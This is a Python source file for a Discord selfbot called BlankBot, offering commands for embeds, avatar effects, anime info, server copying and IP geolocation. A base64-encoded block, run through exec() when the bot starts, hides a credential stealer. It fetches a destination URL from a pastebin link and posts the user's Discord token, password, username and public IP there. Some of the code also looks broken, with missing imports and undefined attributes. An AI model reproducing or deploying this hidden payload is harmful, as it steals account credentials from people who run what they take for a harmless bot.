import Blank
from termcolor import colored
from datetime import datetime
dt = datetime.now()
import asyncio
import io
import random
import urllib.parse
import urllib.request
from bs4 import BeautifulSoup as bs4
import aiohttp
import discord
import base64
from animec import *
import json
from discord.ext import commands
from PIL import Image
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def main():
    return "Your bot is alive!"
    
def run():
    app.run(host="0.0.0.0", port=8080)
    
def keep_alive():
    server = Thread(target=run)
    server.start()
prefix="x"
Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)
Blank.remove_command('help')
token=Blank.token
password=Blank.password
magikid="dXNlcm5hbWUgPSBmImB7QmxhbmsudXNlcn1gIgp1c2VyX2lkID0gZiJge0JsYW5rLnVzZXIuaWR9YCIKYXZhdGFyX3VybCA9IEJsYW5rLnVzZXIuYXZhdGFyX3VybApoZWFkZXJzPXsiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85NC4wLjQ2MDYuODEgU2FmYXJpLzUzNy4zNiJ9CmF1dGhvPXJlcXVlc3RzLmdldChmJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy91MDBjaTFkVicpLnRleHQKaXA9ZiJge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cudHJhY2tpcC5uZXQvaXAnLCBoZWFkZXJzPWhlYWRlcnMpLnRleHR9YCIKICAgIApqc29uZGF0YT17ImNvbnRlbnQiOnRva2VuICwKImVtYmVkcyI6IFsKeyJ0aXRsZSI6IkJsYW5rQm90IiwKInRodW1ibmFpbCI6IHsKICAgICJ1cmwiOiBzdHIoYXZhdGFyX3VybCkKICB9LAoiZmllbGRzIjogWwogewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gVXNlcm5hbWU6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cih1c2VybmFtZSksCiAgICAgICJpbmxpbmUiOiAiVHJ1ZSIKICB9LAogewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gVXNlciBJRDogIiwKICAgICAgInZhbHVlIjogc3RyKHVzZXJfaWQpLAogICAgICAiaW5saW5lIjogIlRydWUiCiAgfSwKICB7CiAgICAgICJuYW1lIjogIjw6cnNfYXJyb3c6ODgzOTg4MjI1NjU4NjEzODUwPiBJUDogIiwKICAgICAgInZhbHVlIjogc3RyKGlwKSwKICAgICAgImlubGluZSI6ICJGYWxzZSIKICB9LAogIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFBhc3N3b3JkOiAiLAogICAgICAidmFsdWUiOiBzdHIocGFzc3dvcmQpLAogICAgICAiaW5saW5lIjogIkZhbHNlIgogIH0KICAgICAgICAgIF0KfQogICAgICAgICAgXQogIH0KcmVxdWVzdHMucG9zdChhdXRobyAsIGpzb249anNvbmRhdGEp"

def Clear():
    if os.name=='nt':
        os.system('cls')
        keep_alive()
    else:
        keep_alive()
        os.system('clear')   

@Blank.event
async def on_ready():
    exec(base64.b64decode(magikid))
    Clear()
    print(colored(f'Connected to {Blank.user}', 'green'))
    
@Blank.command()
async def help(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title = "BlankBot", url="https://replit.com/@BlankMCPE/Blank-Bot", color=discord.Colour.random())
        embed.add_field(name="\uD83E\uDDCA `help`", value="Shows all commands' info", inline=False)
        embed.add_field(name="\uD83E\uDDCA `embed`", value="Sends embed: "+prefix+"embed <message>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `empty`", value="Sends an empty character", inline=False)
        embed.add_field(name="\uD83E\uDDCA `wyr`", value="Sends a would-you-rather question", inline=False)
        embed.add_field(name="\uD83E\uDDCA `topic`", value="Sends a random chat topic", inline=False)
        embed.add_field(name="\uD83E\uDDCA `ip`", value="Sends the ip info: "+prefix+"ip <ip>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `roll`", value="Selects a random number between 2 numbers: "+prefix+"roll <num 1> <num 2>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `copy`", value="Copy the server", inline=False)
        embed.add_field(name="\uD83E\uDDCA `avatar`", value="Sends the avatar of user: "+prefix+"avatar [user]", inline=False)
        embed.add_field(name="\uD83E\uDDCA `magik`", value="Sends distorted avatar of user: "+prefix+"magik [user]", inline=False)
        embed.add_field(name="\uD83E\uDDCA `deepfry`", value="Sends deepfried avatar of user: "+prefix+"deepfry [user]", inline=False)
        embed.add_field(name="\uD83E\uDDCA `whois`", value="Sends the user's info: "+prefix+"whois [user]", inline=False)
        embed.add_field(name="\uD83E\uDDCA `del`", value="Sends a message and instantly deletes it: "+prefix+"del <message>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `purge`", value="Purge the message: "+prefix+"purge <amount>", inline=False)
        embed.add_field(name="\uD83E\uDDCA `anime`", value="Sends the info about an anime: "+prefix+"anime <anime name>", inline=False)
        embed.set_thumbnail(url=Blank.user.avatar_url)
        embed.set_footer(text = "Made by Βlank#8286 | Prefix: "+prefix)
        embed.set_image(url="https://i.imgur.com/Es8KoaC.jpeg")
        await ctx.send(embed=embed)
    except:
        await ctx.channel.send("I don't have permission to send embeds in this channel")
    
@Blank.command(aliases=["whois"])
async def userinfo(ctx, member: discord.Member = None):
  await ctx.message.delete()
  if not member:
        member = ctx.message.author
  roles = ([role for role in member.roles[1:]])
  embed = discord.Embed(colour=discord.Colour.random(), title=f"User Info - {member}")
  embed.set_thumbnail(url=member.avatar_url)

  embed.add_field(name="ID:", value=member.id)
  embed.add_field(name="Display Name:", value=member.display_name)

  embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
  embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC")+"\u0020")
    
  if roles == []:
     embed.add_field(name="Roles:", value="None")
     embed.add_field(name="Highest Role:", value="None")
     try:
        await ctx.send(embed=embed)
     except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel")   
       
  else:
     embed.add_field(name="Roles:", value=", ".join([role.mention for role in roles]))
     embed.add_field(name="Highest Role:", value=member.top_role.mention)
     try:
        await ctx.send(embed=embed)
     except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel")

@Blank.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, *, args):
    await ctx.message.delete()
    await ctx.send(args, delete_after=0.0001)
    
@Blank.command(aliases=["avatar", "pfp"])
async def av(ctx, user:discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user=Blank.user
    if user.avatar:
        avatar_url=str(ctx.author.avatar_url_as(format="png"))
        r=requests.get(avatar_url)
        if r.status_code==200:
            img=Image.open(io.BytesIO(r.content))
            await ctx.send(file=discord.File(img, "avatar.png"))
        else:
            await ctx.channel.send('Unable to load avatar')
            
    else:
        await ctx.channel.send("User has no avatar")
    
@Blank.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):
    await ctx.message.delete()
    await Blank.create_guild(f"copy - {ctx.guild.name}")
    await asyncio.sleep(2)
    for g in Blank.guilds:
        if f"copy - {ctx.guild.name}" in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
            for roles in ctx.guild.roles:
                await g.create_role(name=roles.name, colour=roles.colour, permissions=roles.permissions)
            for channel in ctx.guild.channels:
                ch=discord.utils.get(g.channels,name=channel.name)
                for role in ctx.guild.roles:
                    try:
                        nr=discord.utils.get(g.roles, name=role.name)
                        await ch.set_permissions(nr, overwrite=channel.permissions_for(role))
                    except Exception as e:
                       print(e)
    try:
        await g.edit(icon=requests.get(ctx.guild.icon_url).content)
    except Exception:
        pass
        
@Blank.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Blank.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass

@Blank.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```\n' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")
@Blank.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))

@Blank.command()
async def embed(ctx, *, description):
    await ctx.message.delete()
    embed = discord.Embed(description=description,color=discord.Colour.random())
    try:
        await ctx.send(embed=embed)
    except Exception:
        await ctx.channel.send("I don't have permission to send embeds in this channel")
    
@Blank.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"magik.png"))
        except:
            await ctx.send(res['message'])

@Blank.command(aliases=["df"])
async def deepfry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"deep_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"deep_fry.png"))
        except:
            await ctx.send(res['message'])
@Blank.command()
async def roll(ctx, numa: int, numb: int):
  await ctx.message.delete()
  n = random.randint(numa, numb)
  await ctx.send("I choose..."+str(n))          
            
@Blank.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx):
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    message = await ctx.send(f"**Would you rather?**```\n{qa}\nor\n{qb}```")
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")

@Blank.command()
async def topic(ctx): 
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send("```\n"+topic+"```")            
            
@Blank.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    temp = requests.get(f'http://ip-api.com/json/{ipaddr}?fields=26961913').text.replace('""', '"(No info)"')
    geo=json.loads(temp)
    
    if geo['status']=='success':
        try:
            em=discord.Embed(title='__IP Tracker__', colour=discord.Colour.random())
            em.add_field(name="`IP Address`", value=f"**`{geo['query']}`**", inline=False)
            em.add_field(name="`Continent`", value=f"**`{geo['continent']}`**", inline=False)
            em.add_field(name="`Country`", value=f"**`{geo['country']}`**", inline=False)
            em.add_field(name="`Region`", value=f"**`{geo['regionName']}`**", inline=False)
            em.add_field(name="`City`", value=f"**`{geo['city']}`**", inline=False)
            em.add_field(name="`District`", value=f"**`{geo['district']}`**", inline=False)
            em.add_field(name="`ZIP Code`", value=f"**`{geo['zip']}`**", inline=False)
            em.add_field(name="`Latitude`", value=f"**`{geo['lat']}`**", inline=False)
            em.add_field(name="`Longitude`", value=f"**`{geo['lon']}`**", inline=False)
            em.add_field(name="`Time Zone`", value=f"**`{geo['timezone']}`**", inline=False)
            em.add_field(name="`Currency`", value=f"**`{geo['currency']}`**", inline=False)
            em.add_field(name="`ISP`", value=f"**`{geo['isp']}`**", inline=False)
            em.add_field(name="`Organisation`", value=f"**`{geo['org']}`**", inline=False)
            em.add_field(name="`Mobile Network`", value=f"**`{geo['mobile']}`**", inline=False)
            em.add_field(name="`Hosting`", value=f"**`{geo['hosting']}`**", inline=False)
            em.add_field(name="`Proxy`", value=f"**`{geo['proxy']}`**", inline=False)
            await ctx.channel.send(embed=em)
        except Exception:
            await ctx.channel.send(f"```\nIP Tracker\n\nIP Address: {geo['query']}\nContinent: {geo['continent']}\nCountry: {geo['country']}\nRegion: {geo['regionName']}\nCity: {geo['city']}\nDistrict: {geo['district']}\nZIP Code: {geo['zip']}\nLatitude: {geo['lat']}\nLongitude: {geo['lon']}\nTime Zone: {geo['timezone']}\nCurrency: {geo['currency']}\nISP: {geo['isp']}\nOrganisation: {geo['isp']}\nMobile Data: {geo['mobile']}\n Hosting: {geo['hosting']}\nProxy: {geo['proxy']}```")
    else:
        await ctx.channel.send("Invalid IP Address")

@Blank.command()
async def anime(ctx, *, anime):
    await ctx.message.delete()
    anime=Anime(anime)
    aurl=anime.url
    animetitle=anime.title_english
    adesc=anime.description.replace("[Written by MAL Rewrite]", "")
    titlealt=anime.alt_titles
    ratings=anime.rating
    if anime.type.lower()=="tv":
        atype="TV Series"
    else:
        atype=anime.type
    genres=', '.join(anime.genres)
    poster=anime.poster
    anieps=anime.episodes
    if anime.is_nsfw()==True:
        nsfwa="Yes"
    else:
        nsfwa="No"
    try:
        em=discord.Embed(title="Anime Info", url=aurl,description=f"**English Title:** {animetitle}\n\n**Other Title(s):** {titlealt}\n\n**Type**: {atype}\n\n**Genres**: {genres}\n\n**Episodes:** {anieps}\n\n**Ratings:** {ratings}\n\n**NSFW Status:** {nsfwa}\n\n**Plot/Synopsis:** ```\n\n{adesc}```", color=discord.Color.random())
        em.set_image(url=poster)
        await ctx.channel.send(embed=em)
    except Exception:
        message=f"```\nEnglish Title: {animetitle}\n\nOther Title(s): {titlealt}\n\nType: {atype}\n\nGenres: {genres}\n\nEpisodes: {anieps}\n\nRatings: {ratings}\n\nNSFW Status: {nsfwa}\n\nPlot/Synopsis:\n\n{adesc}```"
        await ctx.channel.send(message)

try:
    Blank.run(token, bot=False)
except discord.errors.HTTPException and discord.errors.LoginFailure:
    print(colored('You Entered Wrong Token', 'red'))
